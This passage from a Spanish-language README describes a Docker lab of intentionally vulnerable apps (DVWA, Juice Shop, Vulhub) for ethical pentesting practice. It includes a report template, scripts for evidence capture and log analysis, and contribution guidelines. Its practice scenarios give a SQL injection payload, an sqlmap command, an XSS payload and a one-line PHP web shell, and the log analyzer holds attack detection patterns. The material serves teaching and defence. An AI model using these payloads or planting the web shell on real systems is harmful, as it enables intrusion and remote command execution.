        "type": "stat",
        "targets": [
          {
            "expr": "up",
            "legendFormat": "{{instance}}"
          }
        ]
      }
    ]
  }
}
```

## 🧪 Laboratorio y Evidencias

### Escenarios de Práctica Documentados

#### Escenario 1: SQL Injection en DVWA

**Objetivo**: Explotar vulnerabilidad SQL Injection en DVWA para extraer información de la base de datos.

**Pasos**:
1. Acceder a DVWA: http://localhost:8080
2. Configurar nivel de seguridad en "Low"
3. Navegar a "SQL Injection"
4. Probar payload: `1' OR '1'='1`
5. Usar SQLMap para automatizar extracción

**Comandos**:
```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --dbs
```

**Evidencias esperadas**:
- Lista de bases de datos extraídas
- Datos de usuarios revelados
- Screenshots de la explotación

#### Escenario 2: Cross-Site Scripting (XSS) en Juice Shop

**Objetivo**: Ejecutar código JavaScript malicioso en el contexto del navegador de la víctima.

**Pasos**:
1. Acceder a Juice Shop: http://localhost:3000
2. Localizar campo de búsqueda
3. Inyectar payload XSS: `<script>alert('XSS')</script>`
4. Verificar ejecución del código

**Evidencias esperadas**:
- Alert box ejecutándose
- Código JavaScript en el DOM
- Posible robo de cookies

#### Escenario 3: File Upload Vulnerability

**Objetivo**: Subir un shell malicioso aprovechando vulnerabilidades de carga de archivos.

**Pasos**:
1. Crear shell PHP simple
2. Subir archivo a DVWA
3. Acceder al archivo subido
4. Ejecutar comandos en el servidor

**Payload**:
```php
<?php system($_GET['cmd']); ?>
```

### Documentación de Resultados

#### Template de Reporte

```markdown
# Reporte de Penetration Testing

## Información General
- **Fecha**: [FECHA]
- **Tester**: [NOMBRE]
- **Objetivo**: [IP/SERVICIO]
- **Duración**: [TIEMPO]

## Resumen Ejecutivo
[Descripción general de hallazgos]

## Metodología
- Reconocimiento
- Escaneo
- Enumeración
- Explotación
- Post-explotación

## Hallazgos

### Crítico
1. **SQL Injection en DVWA**
   - **CVE**: N/A (Vulnerabilidad intencional)
   - **CVSS**: 9.8
   - **Descripción**: [DETALLE]
   - **Evidencia**: [SCREENSHOTS]
   - **Remediación**: [SOLUCIÓN]

### Alto
[DETALLES]

### Medio
[DETALLES]

### Bajo
[DETALLES]

## Conclusiones
[RESUMEN Y RECOMENDACIONES]
```

### Herramientas de Documentación

#### Script de Captura Automática

```bash
#!/bin/bash
# scripts/management/capture-evidence.sh

EVIDENCE_DIR="./evidences/$(date +%Y%m%d_%H%M%S)"
mkdir -p $EVIDENCE_DIR

echo "=== CAPTURANDO EVIDENCIAS DEL LABORATORIO ==="

# Capturar estado de contenedores
docker ps > $EVIDENCE_DIR/containers_status.txt

# Capturar configuración de red
docker network ls > $EVIDENCE_DIR/networks.txt
for net in $(docker network ls --format "{{.Name}}"); do
    docker network inspect $net > $EVIDENCE_DIR/network_$net.json
done

# Capturar logs importantes
docker-compose logs > $EVIDENCE_DIR/compose_logs.txt

# Capturar configuración de servicios
cp docker-compose.yml $EVIDENCE_DIR/
cp -r config/ $EVIDENCE_DIR/

# Crear reporte de estado
cat << EOF > $EVIDENCE_DIR/lab_report.md
# Reporte del Laboratorio Apache Docker Project

## Fecha: $(date)

## Servicios Activos:
$(docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}")

## Redes Configuradas:
$(docker network ls)

## Espacio Utilizado:
$(docker system df)

EOF

echo "Evidencias capturadas en: $EVIDENCE_DIR"
```

### Métricas y Análisis

#### Script de Análisis de Logs

```python
#!/usr/bin/env python3
# scripts/analysis/log_analyzer.py

import re
import json
from datetime import datetime
from collections import defaultdict

def analyze_apache_logs(log_file):
    """Analizar logs de Apache para identificar ataques"""
    attacks = defaultdict(int)
    ips = defaultdict(int)
    
    with open(log_file, 'r') as f:
        for line in f:
            # Detectar intentos de SQL Injection
            if re.search(r"(union|select|insert|update|delete|drop)", line, re.I):
                attacks['sql_injection'] += 1
            
            # Detectar intentos de XSS
            if re.search(r"(<script|javascript:|alert\()", line, re.I):
                attacks['xss'] += 1
            
            # Contar IPs
            ip_match = re.match(r'^(\d+\.\d+\.\d+\.\d+)', line)
            if ip_match:
                ips[ip_match.group(1)] += 1
    
    return {
        'attacks': dict(attacks),
        'top_ips': dict(sorted(ips.items(), key=lambda x: x[1], reverse=True)[:10])
    }

if __name__ == "__main__":
    result = analyze_apache_logs('./logs/apache/access.log')
    print(json.dumps(result, indent=2))
```

## 📄 Licencia y Contribución

### Licencia MIT

```
MIT License

Copyright (c) 2024 JosephJMRG

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

### Contribución al Proyecto

#### Guía de Contribución

**Para contribuir al proyecto**:

1. **Fork del repositorio**
   ```bash
   git clone https://github.com/TU_USUARIO/apache-docker-project.git
   cd apache-docker-project
   ```

2. **Crear rama para funcionalidad**
   ```bash
   git checkout -b feature/nueva-vulnerabilidad
   git checkout -b fix/correccion-bug
   git checkout -b docs/mejora-documentacion
   ```

3. **Realizar cambios y commits**
   ```bash
   git add .
   git commit -m "feat: Agregar CVE-XXXX-XXXX a Vulhub"
   git commit -m "fix: Corregir problema de red en contenedor X"
   git commit -m "docs: Actualizar guía de instalación"
   ```

4. **Push y Pull Request**
   ```bash
   git push origin feature/nueva-vulnerabilidad
   # Crear Pull Request en GitHub con descripción detallada
   ```

#### Áreas Prioritarias para Contribución

- 🐛 **Reportar y corregir bugs**
- 💡 **Sugerir nuevas funcionalidades**
- 📝 **Mejorar documentación y guías**
- 🔧 **Optimizar scripts y automatización**
- 🎯 **Agregar nuevas vulnerabilidades y escenarios**
- 🛡️ **Mejorar medidas de seguridad**
- 🧪 **Crear nuevos casos de prueba**
- 🌐 **Traducir documentación**

#### Estándares de Código

**Para scripts Bash**:
```bash
#!/bin/bash
# Descripción del script
# Autor: [NOMBRE]
# Fecha: [FECHA]

set -euo pipefail  # Modo estricto

# Funciones con documentación
function example_function() {
    local param1="$1"
    echo "Procesando: $param1"
}
```

**Para Docker Compose**:
```yaml
# Comentarios descriptivos
version: '3.8'

services:
  service-name:
    image: image:tag
    container_name: descriptive-name
    # Configuración organizada
    networks:
      - network_name
    environment:
      - VARIABLE=value
```

#### Proceso de Review

1. **Automated checks**: CI/CD pipeline verificará sintaxis y funcionalidad
2. **Code review**: Revisión manual por maintainers
3. **Testing**: Pruebas en entorno de desarrollo
4. **Documentation**: Verificación de documentación actualizada
5. **Merge**: Integración a rama principal tras aprobación

### Créditos y Reconocimientos

#### Proyecto Principal
- **Autor**: JosephJMRG
- **Versión**: 3.0
- **Última actualización**: Junio 2025

#### Componentes de Terceros
- **Docker**: Container platform
- **Vulhub**: Vulnerable environments collection
- **DVWA**: Damn Vulnerable Web Application
- **OWASP Juice Shop**: Modern vulnerable web application
- **WebGoat**: OWASP educational platform
- **Kali Linux**: Penetration testing distribution
- **ELK Stack**: Elasticsearch, Logstash, Kibana
- **Grafana**: Monitoring and observability platform

#### Agradecimientos Especiales
- Comunidad OWASP por las aplicaciones vulnerables
- Proyecto Vulhub por la extensa colección de entornos
- Docker community por la excelente documentación
- Kali Linux team por las herramientas de pentesting

### Soporte y Comunidad

#### Canales de Soporte

**GitHub Issues**: [apache-docker-project/issues](https://github.com/JosephJMRG/apache-docker-project/issues)
- Reportar bugs
- Solicitar funcionalidades
- Preguntas técnicas
- Discusión de mejoras

**Documentación Oficial**: README.md y archivos .md del proyecto

**Recursos Externos**:
- [Docker Documentation](https://docs.docker.com/)
- [Vulhub Official](https://vulhub.org/)
- [OWASP Resources](https://owasp.org/)
- [Kali Linux Documentation](https://www.kali.org/docs/)

#### Información de Contacto

- **Repositorio Principal**: https://github.com/JosephJMRG/apache-docker-project
- **Issues y Bugs**: GitHub Issues
- **Contribuciones**: Pull Requests en GitHub

## 🚀 Inicio Rápido - Comando Único

Para usuarios que quieren empezar inmediatamente:

```bash
git clone https://github.com/JosephJMRG/apache-docker-project.git && cd apache-docker-project && chmod +x automatizar_lab_completo.sh && ./automatizar_lab_completo.sh
```

## 📊 Estadísticas del Proyecto

- **Aplicaciones vulnerables**: 5+ aplicaciones web principales
- **Servicios de red**: 8+ servicios vulnerables
- **Vulnerabilidades Vulhub**: 500+ entornos preconfigurados
- **Categorías de vulnerabilidades**: 70+ categorías
- **Arquitecturas soportadas**: x86_64, ARM64 (experimental)
- **Sistemas operativos**: Windows 11, Linux, macOS
- **Líneas de código**: 5000+ líneas en scripts y configuraciones
- **Documentación**: Más de 50 páginas de documentación técnica

**⚡ ¡Empieza tu journey de pentesting ético ahora mismo!**

*Desarrollado con ❤️ para la comunidad de ciberseguridad*

**Versión 3.0** | **Última actualización: Junio 2025** | **Autor: JosephJMRG**
